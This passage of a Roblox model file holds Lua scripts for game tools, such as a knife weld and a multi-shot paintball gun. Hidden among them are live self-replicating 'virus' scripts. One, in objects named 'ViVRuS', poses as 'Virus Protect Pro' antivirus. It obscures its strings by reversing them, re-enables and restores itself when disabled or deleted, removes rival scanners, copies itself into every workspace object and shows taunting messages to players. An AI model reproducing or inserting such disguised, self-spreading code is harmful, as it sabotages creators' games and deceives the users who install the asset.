w.C1 = CFrame.new(distance, 0.15 +y, -0.25 +x *-1) * CFrame.fromEulerAnglesXYZ(math.pi, 0, 0)
elseif weldmode == 3 then--knife in pant&apos;s back, gangsta like
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0 +y, 0.25 +x) * CFrame.fromEulerAnglesXYZ(math.pi , math.pi / 2, 0)
elseif weldmode == 4 then--knife in pant&apos;s front, gangsta like
local w = Instance.new(&quot;Weld&quot;)
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0 +y, 0.25 +x) * CFrame.fromEulerAnglesXYZ(math.pi , math.pi / 2 *-1, 0)
end
end
end
end
end
end
end
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
if model ~= nil then
n = 1
local all = model:GetChildren()
for i = 1, #all do
if all[i].className == &quot;Part&quot; then
all[i].Transparency = 1
end
end
end
end
--check
function off(mouse)
if model ~= nil then
n = 1
local all = model:GetChildren()
for i = 1, #all do
if all[i].className == &quot;Part&quot; then
all[i].Transparency = parts[n]
local Do = true
if Do then
Do = false--dude!
n = n +1
end
end
end
end
end
--please?
script.Parent.Equipped:connect(on)
script.Parent.Unequipped:connect(off)</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="LocalScript" referent="RBX231">
					<Properties>
						<bool name="Disabled">true</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Weld2</string>
						<ProtectedString name="Source">function Weld(x,y)
	local W = Instance.new(&quot;Weld&quot;)
	W.Part0 = x
	W.Part1 = y
	local CJ = CFrame.new(x.Position)
	local C0 = x.CFrame:inverse()*CJ
	local C1 = y.CFrame:inverse()*CJ
	W.C0 = C0
	W.C1 = C1
	W.Parent = x
end

function Get(A)
	if A.className == &quot;Part&quot; then
		Weld(script.Parent.Handle, A)
		A.Anchored = false
	else
		local C = A:GetChildren()
		for i=1, #C do
		Get(C[i])
		end
	end
end
local yes = true
if yes then
yes = false
Get(script.Parent)
end
function onDied()
script.Parent.Parent = nil
end
h = script.Parent.Parent:FindFirstChild(&quot;Humanoid&quot;)
if h ~= nil then
h.Died:connect(onDied)
end
</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="LocalScript" referent="RBX232">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Local Gui</string>
					<ProtectedString name="Source">local Tool = script.Parent;

enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	enabled = true
	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;

	--wait(.5)
	--mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	--enabled = true
	--mouse.Button1Up:connect(function() onButton1Up(mouse) end)

end


function onButton1Up(mouse)
enabled = false
Tool.Enabled = false
mouse.Icon = &quot;rbxasset://textures\\GunWaitCursor.png&quot;
wait(2.2)
mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
enabled = true
Tool.Enabled = true
end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)	
	mouse.Button1Up:connect(function() onButton1Up(mouse)end)
end


Tool.Equipped:connect(onEquippedLocal)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="RotateP" referent="RBX233">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX234">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="VelocityMotor" referent="RBX235">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<float name="CurrentAngle">0</float>
					<float name="DesiredAngle">0</float>
					<Ref name="Hole">null</Ref>
					<float name="MaxVelocity">0</float>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Weld" referent="RBX236">
					<Properties>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX237">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX238">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
					<R00>0</R00>
					<R01>0</R01>
					<R02>-1</R02>
					<R10>-0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>1</R20>
					<R21>0</R21>
					<R22>0</R22>
				</CoordinateFrame>
				<string name="Name">Brute Mauler</string>
				<Content name="TextureId"><null></null></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Script" referent="RBX239">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">PaintballShooter</string>
					<ProtectedString name="Source">Tool = script.Parent

colors = {21}

function fire(v)
	Tool.Parent.Torso[&quot;Right Shoulder&quot;].DesiredAngle = 8			--moves your arm as if firing.
	Tool.Handle.Fire:play()
	

	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new(&quot;Part&quot;)

        
	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 8)

	missile.Position = spawnPos
	missile.Size = Vector3.new(1,1,1)
	missile.Velocity = v * 500
	missile.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile.Shape = 1
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = &quot;Paintball&quot;
	missile.Elasticity = 0
	missile.Reflectance = 0.2
	missile.Friction = .3

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,220,0)
	force.Parent = missile
	
	Tool.BrickCleanup:clone().Parent = missile

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile
	


	missile.Parent = game.Workspace


	local missile2 = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 6)

	missile2.Position = spawnPos
	missile2.Size = Vector3.new(1,1,1)
	missile2.Velocity = v * 700
	missile2.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile2.Shape = 1
	missile2.BottomSurface = 0
	missile2.TopSurface = 0
	missile2.Name = &quot;Paintball2&quot;
	missile2.Elasticity = 0
	missile2.Reflectance = 0.2
	missile2.Friction = .3

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(150,220,0)
	force.Parent = missile2
	
	Tool.BrickCleanup:clone().Parent = missile2

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile2

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile2
	


	missile2.Parent = game.Workspace


	local missile3 = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 9)

	missile3.Position = spawnPos
	missile3.Size = Vector3.new(1,1,1)
	missile3.Velocity = v * 400
	missile3.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile3.Shape = 1
	missile3.BottomSurface = 0
	missile3.TopSurface = 0
	missile3.Name = &quot;Paintball3&quot;
	missile3.Elasticity = 0
	missile3.Reflectance = 0.2
	missile3.Friction = .3

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,220,150)
	force.Parent = missile3
	
	Tool.BrickCleanup:clone().Parent = missile3

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile3

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile3
	


	missile3.Parent = game.Workspace

	local missile4 = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 11)

	missile4.Position = spawnPos
	missile4.Size = Vector3.new(1,1,1)
	missile4.Velocity = v * 550
	missile4.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile4.Shape = 1
	missile4.BottomSurface = 0
	missile4.TopSurface = 0
	missile4.Name = &quot;Paintball4&quot;
	missile4.Elasticity = 0
	missile4.Reflectance = 0.2
	missile4.Friction = .3

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(20,220,100)
	force.Parent = missile4
	
	Tool.BrickCleanup:clone().Parent = missile4

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile4

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile4
	


	missile4.Parent = game.Workspace

	local missile5 = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 4)

	missile5.Position = spawnPos
	missile5.Size = Vector3.new(1,1,1)
	missile5.Velocity = v * 595
	missile5.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile5.Shape = 1
	missile5.BottomSurface = 0
	missile5.TopSurface = 0
	missile5.Name = &quot;Paintball5&quot;
	missile5.Elasticity = 0
	missile5.Reflectance = 0.2
	missile5.Friction = .3

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,220,50)
	force.Parent = missile5
	
	Tool.BrickCleanup:clone().Parent = missile5

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile5

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile5
	


	missile5.Parent = game.Workspace

   	local missile6 = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 13)

	missile6.Position = spawnPos
	missile6.Size = Vector3.new(1,1,1)
	missile6.Velocity = v * 595
	missile6.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile6.Shape = 1
	missile6.BottomSurface = 0
	missile6.TopSurface = 0
	missile6.Name = &quot;Paintball6&quot;
	missile6.Elasticity = 0
	missile6.Reflectance = 0.2
	missile6.Friction = .3

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(5,220,0)
	force.Parent = missile6
	
	Tool.BrickCleanup:clone().Parent = missile6

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile6

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile6
	


	missile6.Parent = game.Workspace

   	local missile7 = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 7)

	missile7.Position = spawnPos
	missile7.Size = Vector3.new(1,1,1)
	missile7.Velocity = v * 595
	missile7.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile7.Shape = 1
	missile7.BottomSurface = 0
	missile7.TopSurface = 0
	missile7.Name = &quot;Paintball7&quot;
	missile7.Elasticity = 0
	missile7.Reflectance = 0.2
	missile7.Friction = .3

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,220,5)
	force.Parent = missile7
	
	Tool.BrickCleanup:clone().Parent = missile7

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile7

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile7
	


	missile7.Parent = game.Workspace

        end



Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false
	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print(&quot;Humanoid not found&quot;)
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = (targetPos - character.Head.Position).unit

	fire(lookAt)

	wait(.7)

	Tool.Enabled = true
end
script.Parent.Activated:connect(onActivated)

</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX240">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Local Gui</string>
					<ProtectedString name="Source">local Tool = script.Parent;

enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	enabled = false
	mouse.Icon = &quot;rbxasset://textures\\GunWaitCursor.png&quot;

	wait(.7)
	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	enabled = true

end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end


Tool.Equipped:connect(onEquippedLocal)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX241">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Paintball</string>
					<ProtectedString name="Source">ball = script.Parent

damage = 25







function onTouched(hit)

	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)

			-- make a splat

	for i=1,1 do

		local s = Instance.new(&quot;Part&quot;)

		s.Shape = 1 -- block

		s.formFactor = 2 -- plate

		s.Size = Vector3.new(1,.4,1)

		s.BrickColor = ball.BrickColor

		local v = Vector3.new(math.random(-1,1), math.random(0,1), math.random(-1,1))

		s.Velocity = 25 * v

		s.CFrame = CFrame.new(ball.Position + v, v)

		ball.BrickCleanup:clone().Parent = s

		s.BrickCleanup.Disabled = false

		s.Parent = game.Workspace

		

	end

	



	if humanoid ~= nil then

		tagHumanoid(humanoid)

		humanoid.Health = humanoid.Health - damage

		wait(2)

		untagHumanoid(humanoid)

	end



	connection:disconnect()

	ball.Parent = nil

end



function tagHumanoid(humanoid)

	-- todo: make tag expire

	local tag = ball:findFirstChild(&quot;creator&quot;)

	if tag ~= nil then

		local new_tag = tag:clone()

		new_tag.Parent = humanoid

	end

end





function untagHumanoid(humanoid)

	if humanoid ~= nil then

		local tag = humanoid:findFirstChild(&quot;creator&quot;)

		if tag ~= nil then

			tag.Parent = nil

		end

	end

end



connection = ball.Touched:connect(onTouched)



wait(1.75)

ball.Parent = nil</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX242">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">BrickCleanup</string>
					<ProtectedString name="Source">-- this script removes its parent from the workspace after 24 seconds

wait(1)
script.Parent.Parent = nil</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="RotateP" referent="RBX243">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX244">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="VelocityMotor" referent="RBX245">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<float name="CurrentAngle">0</float>
					<float name="DesiredAngle">0</float>
					<Ref name="Hole">null</Ref>
					<float name="MaxVelocity">0</float>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="RotateP" referent="RBX246">
					<Properties>
						<float name="BaseAngle">3.253354e-033</float>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX247">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
